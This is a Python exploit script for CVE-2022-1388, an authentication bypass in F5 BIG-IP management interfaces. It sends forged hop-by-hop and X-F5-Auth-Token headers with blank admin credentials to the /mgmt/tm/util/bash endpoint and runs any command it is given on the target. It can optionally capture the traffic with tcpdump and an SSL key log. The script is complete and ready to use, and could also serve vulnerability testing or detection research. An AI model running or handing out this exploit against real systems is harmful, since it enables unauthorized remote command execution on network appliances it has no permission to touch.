import argparse
import requests
import sslkeylog
import subprocess

# Disable the 'InsecureRequestWarning' output
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def init():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", "--HOST",  help="Target IP of vulnerable BIG-IP system", required=True)
    parser.add_argument("-p", "--port", "--PORT",     help="Target port on vulnerable BIG-IP system")
    parser.add_argument("-c", "--cmd", "--command",    help="Command to run on target system")
    parser.add_argument("-e", "--export", "--tcpdump",    help="Save the captured traffic from the local machine as a pcap file.", action="store_true")
    
    args = parser.parse_args()
    
    t = args.target
    p = args.port
    c = args.cmd
    e = args.export
    
    if not p:
        # default: 443 (HTTPS)
        p = "443"
    if not c:
        c = "echo 'Successfully passed verification'"
        
    # set up the header
    header = {
            'Connection': 'keep-alive, X-F5-Auth-Token',
            'Content-Type': 'application/json',
            "Connection": "close, X-F5-Auth-Token, X-Forwarded-For, Local-Ip-From-Httpd, X-F5-New-Authtok-Reqd, X-Forwarded-Server, X-Forwarded-Host",
            'X-F5-Auth-Token': 'any',
            'Authorization': 'Basic YWRtaW46'
            }
    
    # set up the target url
    endpoint = "/mgmt/tm/util/bash"
    target = "https://{}:{}".format(t, p) + endpoint
    
    # export
    if e and c:
        export_tcpdump(p)

    # post body with input command
    data = {
            'command': 'run', 
            'utilCmdArgs': '-c "{}"'.format(c)
            }
    return target, header, data

def export_tcpdump(port, seconds=5):
    print("export tcpdump")
    
    # initialize SSL Key log
    sslkeylog.set_keylog('ssl-key.log')
    
    print("# Starting tcpdump on port {} for {} seconds\n".format(port, seconds))
    # don't record anything to screen.
    subprocess.Popen(['tcpdump', '-nnp', '-G {}'.format(seconds), '-W 1', 'port {}'.format(port), '-Uwdetection.pcap'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def CVE_2022_1388(target, header, data):
    try:
        # post the request
        res = requests.post(url=target, headers=header, json=data, proxies=None, timeout=15, verify=False)
        try: 
            res.json()['commandResult']
            # output: result part
            print(res.json()['commandResult'])
        except:
            print(res)

    except KeyError:
        print("Error:", res)

if __name__ == "__main__":
    target, header, data = init()
    CVE_2022_1388(target, header, data)